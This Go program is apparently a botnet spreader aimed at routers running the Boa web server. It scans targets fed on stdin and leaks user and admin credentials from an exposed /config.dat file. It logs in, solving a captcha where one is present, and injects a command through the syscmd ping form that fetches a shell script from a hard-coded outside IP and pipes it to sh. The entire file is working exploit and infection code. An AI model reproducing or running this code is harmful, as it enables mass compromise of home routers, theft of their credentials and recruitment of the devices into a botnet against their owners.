package main

import (
	"flag"
	"net"
	"os"
	"time"

	//"regexp"
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"sync"
)

const (
	INVALID       = -1
	SYS_CMD       = 0
	PING_CMD      = 1
	PING_TOTO_CMD = 2
)

var (
	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found     uint64
	exploited uint64
	//payload = "reboot"
	payload = "1.1c-c%3Bwget+-qO-+http%3A%2F%2F23.132.164.27%3A80%2Fl%7Csh%3B"
)

func Decode(ucInput []byte, inLen uint32, ucOutput []byte, expLen uint32) uint32 {
	var i uint32
	var j uint32
	var k uint32
	var r int
	var c uint32
	var flags uint32
	var ulPos uint32 = 0
	var ulExpLen uint32 = 0

	text_buf := make([]byte, (4096 + 18 - 1))

	i = 0
	for i < 4096-18 {
		text_buf[i] = 32
		i++
	}
	r = 4096 - 18
	flags = 0

	for {
		flags = flags >> 1
		if flags&256 == 0 {

			if ulPos >= inLen {
				break
			}

			if ulPos >= 32756 {
				break
			}

			c = uint32(ucInput[ulPos])
			ulPos++

			flags = c | 0xff00
		}
		if flags&1 != 0 {

			if ulPos >= 32756 {
				break
			}

			c = uint32(ucInput[ulPos])
			ulPos++

			if ulPos >= inLen || ulExpLen >= expLen {
				break
			}

			ucOutput[ulExpLen] = uint8(c)
			ulExpLen++

			text_buf[r] = uint8(c)
			r++
			r &= (4096 - 1)
		} else {

			if ulPos >= inLen {
				break
			}

			if ulPos >= 32756 {
				break
			}

			i = uint32(ucInput[ulPos])
			ulPos++

			if ulPos >= inLen {
				break
			}

			if ulPos == 32756 {
				break
			}

			j = uint32(ucInput[ulPos])
			ulPos++

			i |= ((j & 0xf0) << 4)
			j = (j & 0x0f) + 2
			k = 0
			for k <= j {
				c = uint32(text_buf[(i+k)&(4096-1)])

				if ulExpLen >= expLen {
					break
				}

				if ulPos >= 32756 {
					break
				}

				ucOutput[ulExpLen] = uint8(c)
				ulExpLen++

				text_buf[r] = uint8(c)
				r++
				r &= (4096 - 1)
				k++
			}
		}
	}

	if ulExpLen < expLen {
		for i := ulExpLen; i < expLen; i++ {
			ucOutput[i] = 0
		}
	}

	return ulExpLen
}

func confCheck(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /config.dat HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "HTTP/1.1 200 OK") && strings.Contains(buff.String(), "Content-Disposition: attachment")
}

func findByteEnd(data []byte) int {
	for idx, rune := range data {
		if rune == '\x00' {
			return idx
		}
	}

	return -1
}

func getCredLeak(target string) (string, string) {
	resp, err := http.Get(fmt.Sprintf("http://%s/config.dat", target))
	if err != nil {
		// handle error
		return "", ""
	}
	defer resp.Body.Close()

	dat, err := io.ReadAll(resp.Body)
	if err != nil {
		// handle error
		return "", ""
	}

	compRate := binary.BigEndian.Uint16(dat[6:8])
	compLen := binary.BigEndian.Uint32(dat[8:12])

	expLen := uint32(compRate) * uint32(compLen)

	if compRate > 100 {
		return "", ""
	}

	compr := dat[12:]

	out := make([]byte, expLen)
	defer func() {
		out = nil
	}()

	Decode(compr, compLen, out, expLen)

	userPattern := []byte("\xb6\x00\x1f")
	passPattern := []byte("\xb7\x00\x1f")

	userIdx := bytes.Index(out, userPattern) + 3

	if userIdx <= 2 {
		return "", ""
	}

	username := string(out[userIdx : userIdx+findByteEnd(out[userIdx:])])

	passIdx := bytes.Index(out, passPattern) + 3

	if passIdx <= 2 {
		return "", ""
	}

	password := string(out[passIdx : passIdx+findByteEnd(out[passIdx:])])
	return username, password
}

func getAdminCredLeak(target string) (string, string) {
	resp, err := http.Get(fmt.Sprintf("http://%s/config.dat", target))
	if err != nil {
		// handle error
		return "", ""
	}
	defer resp.Body.Close()

	dat, err := io.ReadAll(resp.Body)
	if err != nil {
		// handle error
		return "", ""
	}

	compRate := binary.BigEndian.Uint16(dat[6:8])
	compLen := binary.BigEndian.Uint32(dat[8:12])

	expLen := uint32(compRate) * uint32(compLen)

	if compRate > 100 {
		return "", ""
	}

	compr := dat[12:]

	out := make([]byte, expLen)
	defer func() {
		out = nil
	}()

	Decode(compr, compLen, out, expLen)

	userPattern := []byte("\xb4\x00\x1f")
	passPattern := []byte("\xb5\x00\x1f")

	userIdx := bytes.Index(out, userPattern) + 3

	if userIdx <= 2 {
		return "", ""
	}

	username := string(out[userIdx : userIdx+findByteEnd(out[userIdx:])])

	passIdx := bytes.Index(out, passPattern) + 3

	if passIdx <= 2 {
		return "", ""
	}

	password := string(out[passIdx : passIdx+findByteEnd(out[passIdx:])])
	return username, password
}

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Server: Boa")
}

func findCaptcha(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /login.htm HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "getSanvas")
}

func getOrgData(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	data := "{\"topicurl\":\"getting/IsOrgUserPass\"}"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /boafrm/formLogin HTTP/1.1\r\nReferer: http://" + target + "/login.htm\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return ""
}

func getCaptcha(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	data := "{\"topicurl\":\"setting/getSanvas\"}"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /boafrm/formLogin HTTP/1.1\r\nReferer: http://" + target + "/login.htm\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "HTTP/1.1 200 OK") {
		captcha := strings.Split(buff.String(), "\r\n\r\n")

		if len(captcha) > 1 {
			return captcha[1]
		}
	}

	return ""
}

func loginDeviceCaptcha(target, username, password, captcha string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "{\"topicurl\":\"setting/setUserLogin\",\"username\":\"" + username + "\",\"userpass\":\"" + password + "\",\"checkcode\":\"" + captcha + "\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36\",\"submit-url\":\"/login.htm\"}"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /boafrm/formLogin HTTP/1.1\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: */*\r\nOrigin: http://" + target + "\r\nReferer: http://" + target + "/login.htm\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "HTTP/1.1 200 OK") && !strings.Contains(buff.String(), "lgerr")
}

func loginDevice(target, username, password string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "username=" + username + "&password=" + password + "&login_btn=Login"
	cntLen := strconv.Itoa(len(data))

	req := "POST /boafrm/formLogin HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: */*\r\nOrigin: http://" + target + "\r\nReferer: http://" + target + "/login.htm\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36\r\n\r\n" + data

	conn.Write([]byte(req))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "home.htm")
}

func syscmdPingToto(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "submit-url=%2Fsyscmd.htm&sysCmdselect=5&sysCmdselects=0&save_apply=Run+Command&sysCmd=" + payload
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /boafrm/formSysCmd HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + cntLen + "\r\nReferer: http://" + target + "/syscmd.htm\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "syscmd.htm")
}

func syscmdPing(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "sysCmdType=ping&sysCmd=-c+4%3B" + payload + "&apply=Apply&submit-url=%2Fsyscmd.htm&msg="
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /boafrm/formSysCmd HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + cntLen + "\r\nReferer: http://" + target + "/syscmd.htm\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "syscmd.htm")
}

func findSysCmd(target string) int {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return -1
	}

	defer conn.Close()

	conn.Write([]byte("GET /syscmd.htm HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "sysCmdType") {
		if strings.Contains(buff.String(), "ping") {
			return PING_CMD
		}

		return SYS_CMD
	}

	if strings.Contains(buff.String(), "sysCmdselect") {
		if strings.Contains(buff.String(), "ping") {
			return PING_TOTO_CMD
		}
	}

	return -1
}

func checkSyscmd(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /syscmd.htm HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "sysCmd")
}

func decideInfectPayload(target string) {
	res := findSysCmd(target)

	if res == -1 {
		return
	}

	if res == SYS_CMD {
		fmt.Printf("[SYSCMD] %s found cmd syscmd\n", target)
	} else if res == PING_CMD {
		fmt.Printf("[SYSCMD] %s found ping syscmd\n", target)
		if syscmdPing(target) {
			fmt.Printf("[SYSCMD] %s ping sent payload\n", target)
			exploited++
		}
	} else if res == PING_TOTO_CMD {
		fmt.Printf("[SYSCMD] %s found ping toto syscmd\n", target)
		if syscmdPingToto(target) {
			fmt.Printf("[SYSCMD] %s ping toto sent payload\n", target)
			exploited++
		}
	}
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	if !confCheck(target) {
		return
	}

	found++

	fmt.Printf("[SYSCMD] found device %s\n", target)

	var username, password string

	username, password = getCredLeak(target)

	if username == "" || password == "" {
		return
	}

	fmt.Println(target, username, password)

	fmt.Printf("[SYSCMD] %s %s:%s\n", target, username, password)
	//getOrgData(target)

	loginCaptcha := findCaptcha(target)

	/* this is TOTOLINK BOTNET */
	if loginCaptcha == true {
		captcha := getCaptcha(target)

		fmt.Printf("[SYSCMD] %s found captcha '%s'\n", target, captcha)

		if !loginDeviceCaptcha(target, username, password, captcha) {
			return
		}

		fmt.Printf("[SYSCMD] %s logged in with %s:%s\n", target, username, password)
		decideInfectPayload(target)

	} else {

		if !loginDevice(target, username, password) {
			return
		}

		if !checkSyscmd(target) {
			fmt.Printf("[SYSCMD] %s no access to syscmd %s:%s\n", target, username, password)
			username, password = getAdminCredLeak(target)

			if username == "" || password == "" {
				return
			}

			if !loginDevice(target, username, password) {
				return
			}
		}

		fmt.Printf("[SYSCMD] %s logged in with %s:%s\n", target, username, password)
		decideInfectPayload(target)
	}
}

var startTime = time.Now()

func titleWriter() {
	for {
		fmt.Printf("%ds -> Processed: %d -> Credentials Leaked: %d -> Executed: %d\n", startTime.Second(), processed, found, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	var Separator, Port string

	flag.StringVar(&Port, "port", "listen", "Device port")
	flag.StringVar(&Separator, "sep", ",", "Separator")
	flag.Parse()

	go titleWriter()

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)

		for scan.Scan() {
			if Port == "listen" {
				go exploitDevice(strings.ReplaceAll(scan.Text(), Separator, ":"))
			} else {
				go exploitDevice(scan.Text() + ":" + Port)
			}
		}
	}

	wg.Wait()
}
